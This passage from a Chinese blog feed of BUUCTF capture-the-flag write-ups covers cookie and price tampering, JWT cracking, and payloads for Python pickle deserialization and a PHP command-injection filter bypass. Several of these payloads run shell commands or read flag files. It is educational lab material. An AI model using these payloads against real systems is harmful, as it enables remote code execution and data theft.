class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-comment">//B8F2IQkNd6gc0fOa7AvT</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/choujiang3.png" alt="choujiang3"></p><p>利用种子生成随机数再生成密码后注意和前十位对一下(PHP版本不同生成的结果不同)</p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>商店类型题目：</p><p><img src="/img/cookiestore1.png" alt="cookiestore1"></p><p>最开始有<code>50</code>，购买<code>FLAG</code>需要<code>100</code>，购买时抓包看下过程：</p><p><img src="/img/cookieeeestore2.png" alt="cookieeeestore2"></p><p>注意这段<code>cookie</code>，数字大小写字母混合等号结尾，看着像<code>base64</code>，解码：</p><p><img src="/img/cookiestore3.png" alt="cookiestore3"></p><p>以<code>JSON</code>格式存有钱和历史购买记录，直接修改<code>money</code>为<code>10000</code>:</p><p><img src="/img/cookiestore4.png" alt="cookiestore4"></p><p>购买<code>flag</code>然后把<code>cookie</code>换了就行，买完<code>flag</code>是多少会自己显示。</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目提示<code>python,pickle</code>，应该是<code>pickle</code>的反序列化漏洞</p><p><img src="/img/kun1.png" alt="kun1"></p><p><img src="/img/kun2.png" alt="kun2"></p><p>目测是要通过数据包修改买个<code>lv6</code>的账号，不过这个账号有很多页要一页一页翻(也可以写个脚本试试)？先注册看看怎么个事：</p><p><img src="/img/kun3.png" alt="kun3"></p><p>可以看到刚进去我们是有<code>1000</code>的启动资金，页面<code>URL:http://7e29da18-470a-4d1c-99c1-70e88eff89f1.node4.buuoj.cn:81/shop?page=2</code> ，写个脚本找<code>lv6</code>的界面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>最开始这个脚本跑的时候直接回显了<code>1</code>，但第一页并没有<code>lv6</code>这个东西，我加了个<code>print(r.text)</code>看看怎么个事：</p><p><img src="/img/kun5.png" alt="kun5"></p><p>可以看到这里的字符实在太多，可能有其它东西触发了<code>lv6</code>这个关键字，看了源码发现它的<code>lv</code>是有一定格式的，比如：</p><p><img src="/img/kun6.png" alt="kun6"></p><p>所以把<code>lv6</code>改成<code>lv6.png</code>就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># 181</span><br></code></pre></td></tr></table></figure><p>果然在<code>181</code>页发现了我们需要的：</p><p><img src="/img/kun7.png" alt="kun7"></p><p><img src="/img/kun8.png" alt="kun8"></p><p>很明显我们钱不够，抓包看看能不能修改啥的：</p><p><img src="/img/kun9.png" alt="kun9"></p><p>注意这里的<code>price</code>和<code>discount</code>，我们只有一千块，我一开始把价格改成<code>1</code>了但发现不行。。只能通过修改折扣购买(0.0000000001)：</p><p><img src="/img/kun10.png" alt="kun10"></p><p>其实是个302重定向，定向到了<code>b1g_m4mber</code>页面，但提示我们只有<code>admin</code>可以访问：</p><p><img src="/img/kun11.png" alt="kun11"></p><p>其实这里就有点思路了，根据题目提示<code>python,pickle</code>现在只允许管理员访问，那大概率是在<code>cookie</code>中找线索了(注意这里的<code>JWT</code>字段)：</p><p><img src="/img/kun12.png" alt="kun12"></p><p>先把<code>JWT</code>解码：<code>(https://www.bejson.com/jwt/)</code></p><p><img src="/img/kun13.png" alt="kun13"></p><p>可以看到这段<code>JWT</code>是包含着我们用户名的数据，我一开始想的是肯定有什么字段包含着<code>guest</code>之类的东西，然后把它改成<code>admin</code>加密传过去。。但捣鼓了半天不知道这个字段藏在哪了，后面参考了其它师傅的wp发现原来改个<code>username</code>就行。。。先利用<code>jwtcrack</code>爆破这个<code>JWT</code>:</p><p><img src="/img/kun14.png" alt="kun14"></p><p><code>1Kun</code></p><p><img src="/img/kun15.png"></p><p><img src="/img/kun16.png" alt="kun16"></p><p>点这个成为大会员的按钮没啥反应。。看源码有这么个东西：</p><p><img src="/img/kun17.png" alt="kun17"></p><p>访问<code>ef235c7d-6775-4801-a866-8532c547a07c.node4.buuoj.cn:81/static/asd1f654e683wq/www.zip</code>，下载源码：</p><p>根据提示我们找和<code>pickle</code>有关的序列化反序列化操作就行：</p><p><code>pickle.loads</code>存在于<code>Admin.py</code>中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>注意这部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br><span class="hljs-comment">#解码URL编码的数据，然后将结果传递给pickle.loads进行反序列化操作。</span><br><span class="hljs-comment">#我们的payload可以写成：</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urlib.parse<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br><br>a = pickle.dumps(Note())<br>a = urllib.parse.quote(a)<br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment">#%80%04%95%3F%00%00%00%00%00%00%00%8C%08builtins%94%8C%04eval%94%93%94%8C%23__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%94%85%94R%94.</span><br></code></pre></td></tr></table></figure><p>这段代码在我的<code>Kali</code>下可以运行，但放到题目中没用，不知道啥原因去看了<code>wp</code>：</p><p>题目的源码是用python2写的，而且pickle这东西不支持跨版本操作，至于为什么是python2可以从下面这几个例子看出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)  <span class="hljs-comment">#python2中print是一个关键字，而不是一个函数，因此在使用print语句时不需要使用括号，但在python3中这东西是一个函数，要加括号。</span><br>p = pickle.loads(urllib.unquote(become))<br>    <span class="hljs-comment">#其实这段代码就是把become经过URL解码绕后进行一系列操作，如果在python3中运行这个会提示没有unquote这个方法，这东西被移动到urllib.parse模块中，需要from urllib.parse import unquote然后直接a=quote(a)就行。</span><br><span class="hljs-comment">#所以我们要用python2写：</span><br><span class="hljs-comment">#`python2`在线工具：`https://c.runoob.com/compile/6/`</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(Note())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br><span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/kun18.png" alt="kun18"></p><p>后面就不详细写了，改成<code>ls / </code>然后<code>cat /flag.txt</code>读就行</p><p>其实这道题<code>payload</code>的写法很多，我觉得我这个并不好(因为直接利用了<code>import</code>和<code>os</code>，感觉在有些题中会被过滤掉。。这里补充一些其他师傅的<code>payload</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>a = payload()<br><span class="hljs-built_in">print</span> (urllib.quote(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span> ,))<br><br>a = Test()<br>s = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(urllib.quote(s))<br></code></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="/img/rceservice.png" alt="rceservice"></p><p>要求输入必须是<code>JSON</code>格式，类似{“xxx”:”xxx”}这样，如果后面那个是要执行的命令那前面的键该是多少？题目也没啥提示。。找了<code>wp</code>发现这题其实是给了源码的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="hljs-comment">//注意这个环境变量的配置，最开始没注意这个东西导致有些命令执行不了</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123; <span class="hljs-comment">//限制必须是字符串格式</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<span class="hljs-comment">//^开头$结尾,.*表示匹配任意数量的任意字符(除换行外)</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>Enter command as JSON</code>：<code>&#123;&quot;cmd&quot;%3A&quot;ls&quot;&#125;</code>:</p><p><img src="/img/rceservice2.png" alt="rceservice2"></p><p>首先是<code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>这东西，将环境变量 <code>PATH</code> 的值设置为 <code>/home/rceservice/jail</code>。在操作系统中，<code>PATH</code> 环境变量通常用于指定可执行程序的搜索路径。通过将 <code>PATH</code> 设置为 <code>/home/rceservice/jail</code>，可以指定系统在执行命令时只在该目录中查找可执行文件。</p><p><code>putenv 相当于一个简陋的沙盒, 让 shell 默认从 /home/rceservice/jail下寻找命令, 后面看的时候发现这个目录下只有一个 ls, 但其实使用绝对路径执行命令 (/bin/cat) 就能够绕过限制了  //参考：https://exp10it.cn/2022/09/buuctf-web-writeup-5/#fbctf2019rceservice</code></p><p>绕过的话有两种方法，一种是是回溯绕过，第二种就是<code>%0A</code>换行绕过。</p><p>参考文章：<code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=1#reply-list</code></p><p><code>https://www.cnblogs.com/yjken/articles/3922339.html</code></p><p>大致意思就是我们可以通过构造超级长的字符串让<code>preg_match</code>执行失败返回<code>False</code>。这样如果未对结果进行强等于判断<code>===</code>就可以实现绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://d74b595f-f641-43c5-87fb-36ddfabc88f0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;ls /home/&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#ls是可以直接用的</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br><span class="hljs-comment">#注意这里要用POST，因为GET头不能太大否则会返回TooLargeRequest</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice3.png" alt="rceservice3"></p><p>并没有<code>flag</code>，不过我们可以调用<code>find</code>命令查找<code>flag</code>所在位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#注意这里的find</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice4.png" alt="rceservice4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#ls是可以直接用的</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice5.png" alt="rceservice5"></p><p><code>flag&#123;81327f89-050f-46f1-ae16-177e1da4ac08&#125;</code></p><p>换行绕过主要就是<code>.</code>这个东西不会去匹配换行符，一开始想的是构造的<code>payload</code>必须符合<code>JSON</code>这东西的格式，想了挺久不知道该把换行符放哪。</p><p>最开始没看懂师傅们的<code>wp</code>怎么写的，想了一下这东西其实就可以看成：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>%<span class="hljs-number">0</span>A<span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%<span class="hljs-number">0</span>A<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice6.png" alt="rceservice6"></p><p>还有其它两种：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%0A%0A&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;%0A%0A<span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string">`</span>&#123;%0A<span class="hljs-string">&quot;cmd&quot;</span>:%0A<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>参考文章：<code>https://www.cnblogs.com/20175211lyz/p/12198258.html</code></p><p><code>https://www.cnblogs.com/Article-kelp/p/16046129.html</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuctf做题记录_3</title>
    <link href="/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/"/>
    <url>/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录。</p><span id="more"></span><hr><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><code>Hint:flag is in ./flag.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 